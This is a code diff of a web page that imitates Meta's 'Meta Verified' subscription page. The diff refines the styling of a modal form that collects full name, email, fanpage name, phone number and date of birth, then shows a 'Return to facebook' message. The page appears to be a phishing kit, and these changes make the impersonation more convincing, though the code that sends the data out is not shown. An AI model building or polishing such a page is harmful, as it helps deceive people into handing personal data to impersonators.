@@ -2,9 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Verified: Get the verified badge on Instagram and Facebook</title>
     <meta name="description" content="Get the verified badge for impersonation protection, direct support and exclusive features." />
+    <link rel="icon" type="image/svg+xml" href="public/icons/favicon.svg">
+    <link rel="shortcut icon" href="public/icons/favicon.svg">
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
@@ -231,38 +233,52 @@
       /* ===== MODAL ===== */
       .modal-overlay {
         display: none; position: fixed; inset: 0; z-index: 999;
-        background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center; padding: 0;
+        background: rgba(0,0,0,0.55); align-items: flex-end; justify-content: center; padding: 0;
       }
       @media(min-width:600px){ .modal-overlay { align-items: center; padding: 20px; } }
       .modal-overlay.open { display: flex; }
+
       .modal-box {
-        background: #fff; width: 100%; border-radius: 20px 20px 0 0;
-        padding: 20px 16px 32px; display: flex; flex-direction: column;
-        max-height: 92vh; overflow-y: auto; overflow-x: visible;
+        background: #fff; width: 100%;
+        border-radius: 20px 20px 0 0;
+        padding: 20px 16px 32px;
+        padding-bottom: max(28px, env(safe-area-inset-bottom, 28px));
+        display: flex; flex-direction: column;
+        max-height: 90dvh;
+        overflow-y: auto; overflow-x: hidden;
+        -webkit-overflow-scrolling: touch;
+        overscroll-behavior: contain;
         transform: translateY(40px); opacity: 0;
-        transition: transform 0.25s ease, opacity 0.25s ease;
+        transition: transform 0.28s cubic-bezier(.32,.72,0,1), opacity 0.25s ease;
+      }
+      .modal-box::before {
+        content: ''; display: block; width: 36px; height: 4px;
+        background: #d1d5db; border-radius: 4px;
+        margin: -8px auto 14px; flex-shrink: 0;
       }
       @media(min-width:600px){
-        .modal-box { max-width: 420px; border-radius: 16px; padding: 24px; transform: scale(0.92); }
+        .modal-box { max-width: 440px; border-radius: 18px; padding: 24px; transform: scale(0.93); max-height: 88vh; }
+        .modal-box::before { display: none; }
       }
       .modal-overlay.open .modal-box { transform: translateY(0) scale(1); opacity: 1; }
-      .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+
+      .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
       .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
       .modal-close {
-        width: 32px; height: 32px; border: none; background: none; cursor: pointer;
-        font-size: 24px; color: #9a9a9a; border-radius: 50px;
+        width: 34px; height: 34px; border: none; background: #f3f4f6; cursor: pointer;
+        font-size: 20px; color: #6b7280; border-radius: 50%;
         display: flex; align-items: center; justify-content: center; flex-shrink: 0;
-        -webkit-tap-highlight-color: transparent;
+        -webkit-tap-highlight-color: transparent; transition: background 0.15s;
       }
-      .modal-close:active { background: #f0f0f0; }
+      .modal-close:active { background: #e5e7eb; }
       .modal-field {
-        width: 100%; border: 1px solid #d4dbe3; border-radius: 10px;
+        width: 100%; border: 1.5px solid #d4dbe3; border-radius: 12px;
         background: #fff; margin-bottom: 10px; overflow: hidden;
       }
-      .modal-field:focus-within { border-color: #3b82f6; }
+      .modal-field:focus-within { border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.12); }
       .modal-field input {
         width: 100%; outline: none; border: none; background: transparent;
-        font-size: 16px; font-family: inherit; height: 44px; padding: 0 12px; display: block;
+        font-size: 16px; font-family: inherit; height: 48px; padding: 0 14px; display: block;
       }
       .modal-label { font-size: 13px; color: #9a979e; font-weight: 700; margin-bottom: 6px; display: block; }
       .modal-hint { font-size: 13px; color: #9a979e; margin-bottom: 14px; line-height: 1.5; }
@@ -276,39 +292,62 @@
       @keyframes spin { to { transform: rotate(360deg); } }
       .modal-return-btn {
         display: flex; align-items: center; justify-content: center;
-        width: 100%; height: 48px; background: #0064E0; color: #fff;
-        border-radius: 40px; text-decoration: none; font-size: 15px; font-weight: 500;
+        width: 100%; height: 50px; background: #0064E0; color: #fff;
+        border-radius: 40px; text-decoration: none; font-size: 15px; font-weight: 600;
       }
       .modal-return-btn:active { background: #0052c5; }
       .modal-btn-primary {
-        width: 100%; height: 48px; background: #0064E0; color: #fff; border: none;
-        border-radius: 40px; font-size: 16px; font-weight: 500; cursor: pointer;
+        width: 100%; height: 50px; background: #0064E0; color: #fff; border: none;
+        border-radius: 40px; font-size: 16px; font-weight: 600; cursor: pointer;
         font-family: inherit; -webkit-tap-highlight-color: transparent; touch-action: manipulation;
       }
-      .modal-btn-primary:disabled { opacity: 0.75; }
+      .modal-btn-primary:disabled { opacity: 0.7; }
       .modal-btn-primary:active:not(:disabled) { background: #0052c5; }
       .modal-btn-outline {
-        width: 100%; height: 44px; border: 1px solid #d4dbe3; border-radius: 40px;
+        width: 100%; height: 46px; border: 1px solid #d4dbe3; border-radius: 40px;
         background: #fff; font-size: 14px; color: #9a979e; cursor: pointer;
         margin-top: 10px; font-family: inherit; -webkit-tap-highlight-color: transparent;
       }
 
-      /* ===== PHONE SELECTOR ===== */
+      /* ===== INPUT / PHONE SELECTOR ===== */
       .nf-input-wrap {
-        width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
-        border-radius: 10px; background: white; font-size: 14px; margin-bottom: 10px;
+        width: 100%; border: 1.5px solid #d4dbe3; height: 48px; padding: 0 12px;
+        border-radius: 12px; background: #fff; font-size: 14px; margin-bottom: 10px;
         display: flex; align-items: center;
         transition: border-color 0.2s, box-shadow 0.2s;
       }
-      .nf-input-wrap:focus-within, .nf-input-wrap:hover {
-        border-color: #3b82f6; box-shadow: 0 2px 8px rgba(59,130,246,0.1);
+      .nf-input-wrap:focus-within {
+        border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.12);
       }
       .nf-input {
         width: 100%; outline: none; border: none; background: transparent;
         font-size: 16px; font-family: inherit; height: 100%; display: block; padding: 0;
+        color: #1c1e21;
       }
-      .pcs-opt { display: flex; align-items: center; gap: 8px; padding: 10px 14px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+      .nf-input::placeholder { color: #b0b7c3; }
+      .pcs-opt { display: flex; align-items: center; gap: 8px; padding: 12px 14px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
       .pcs-opt:active { background: #f0f4ff; }
+
+      .nf-textarea-wrap {
+        width: 100%; border: 1.5px solid #d4dbe3; padding: 12px;
+        border-radius: 12px; background: #fff; margin-bottom: 10px;
+        transition: border-color 0.2s, box-shadow 0.2s;
+      }
+      .nf-textarea-wrap:focus-within {
+        border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.12);
+      }
+      .nf-textarea-wrap textarea {
+        width: 100%; outline: none; border: none; background: transparent;
+        font-size: 15px; font-family: inherit; resize: none; display: block;
+        color: #1c1e21; min-height: 72px;
+      }
+      .nf-textarea-wrap textarea::placeholder { color: #b0b7c3; }
+
+      .form-section-label {
+        font-size: 12px; font-weight: 600; color: #9a979e;
+        text-transform: uppercase; letter-spacing: 0.06em;
+        margin: 4px 0 8px; display: block;
+      }
 
       .modal-loading-spinner {
         width: 32px; height: 32px; border: 3px solid #e5e7eb;
@@ -363,7 +402,7 @@
         <h1 class="hero-title">Protect your brand with Meta Verified</h1>
         <p class="hero-desc">Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.</p>
         <div class="hero-btns">
-          <button onclick="openClientModal()" class="hero-btn">Submit request</button>
+          <button onclick="openClientModal()" class="hero-btn">Subscribe on Facebook</button>
         </div>
         <p class="hero-note"><strong>Are you a business?</strong> Get more information on <a href="#">Meta Verified for businesses</a>.</p>
         <p class="hero-fine">Features, availability and pricing may vary by region and app.</p>
@@ -907,29 +946,29 @@
 
       var formHtml =
         '<form id="clientForm" autocomplete="off" style="width:100%;">'
+        + '<span class="form-section-label">Personal Info</span>'
         + '<div class="nf-input-wrap"><input id="fullName" placeholder="Full Name" type="text" required autocomplete="name" class="nf-input"></div>'
         + '<div class="nf-input-wrap"><input id="email" placeholder="Email Address" type="email" required inputmode="email" autocomplete="email" class="nf-input"></div>'
-        + '<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Email Business Address" type="email" inputmode="email" class="nf-input"></div>'
+        + '<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Business Email (optional)" type="email" inputmode="email" class="nf-input"></div>'
         + '<div class="nf-input-wrap"><input id="fanpage" placeholder="Fanpage Name" type="text" required class="nf-input"></div>'
+        + '<span class="form-section-label">Phone Number</span>'
         + _buildPhoneSelector()
-        + '<b style="color:#9a979e;font-size:14px;margin-bottom:7px;display:block;">Date of Birth</b>'
-        + '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">'
-        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input"></div>'
-        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input"></div>'
-        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input"></div>'
+        + '<span class="form-section-label">Date of Birth</span>'
+        + '<div style="display:grid;grid-template-columns:1fr 1fr 1.5fr;gap:8px;margin-bottom:10px;">'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input" style="text-align:center;"></div>'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input" style="text-align:center;"></div>'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input" style="text-align:center;"></div>'
         + '</div>'
-        + '<div class="nf-input-wrap" style="height:100px;padding:11px;align-items:flex-start;">'
-        + '<textarea id="message" placeholder="Message" style="width:100%;outline:none;border:none;background:transparent;font-size:16px;font-family:inherit;resize:none;height:100%;display:block;"></textarea>'
+        + '<span class="form-section-label">Message</span>'
+        + '<div class="nf-textarea-wrap">'
+        + '<textarea id="message" placeholder="Your message..." rows="3"></textarea>'
         + '</div>'
-        + '<p style="color:#9a979e;font-size:14px;margin-bottom:7px;">Our response will be sent to you within 14 - 48 hours.</p>'
-        + '<div style="margin-top:15px;margin-bottom:20px;">'
-        + '<label style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px;" for="agreeCheck">'
-        + '<input id="agreeCheck" type="checkbox" required style="width:16px;height:16px;accent-color:#0064E0;flex-shrink:0;">'
-        + 'I agree to the <a href="#" style="color:#0064E0;">Terms of use</a>'
-        + '</label></div>'
-        + '<div style="width:100%;margin-top:20px;">'
+        + '<p style="color:#b0b7c3;font-size:12px;margin:0 0 14px;line-height:1.5;">We will respond within 14–48 hours.</p>'
+        + '<label style="cursor:pointer;display:flex;align-items:center;gap:10px;font-size:14px;color:#4b5563;margin-bottom:20px;padding:12px;background:#f8fafc;border-radius:10px;" for="agreeCheck">'
+        + '<input id="agreeCheck" type="checkbox" required style="width:18px;height:18px;accent-color:#0064E0;flex-shrink:0;">'
+        + '<span>I agree to the <a href="#" style="color:#0064E0;font-weight:600;">Terms of use</a></span>'
+        + '</label>'
         + '<button type="submit" class="modal-btn-primary">Submit</button>'
-        + '</div>'
         + '</form>';
 
       wrap.style.minHeight = '';
@@ -1262,6 +1301,7 @@
       + '<a href="https://www.facebook.com" class="modal-return-btn">Return to facebook</a>'
       + '<div style="text-align:center;margin-top:18px;">'
       + '<img src="public/icons/ic_meta_gray.svg" alt="Meta" style="height:18px;display:inline-block;"'
+      + ' onerror="this.style.display=\'none\'">'
       + '</div>';
 
     Modal.create('successModal', html);
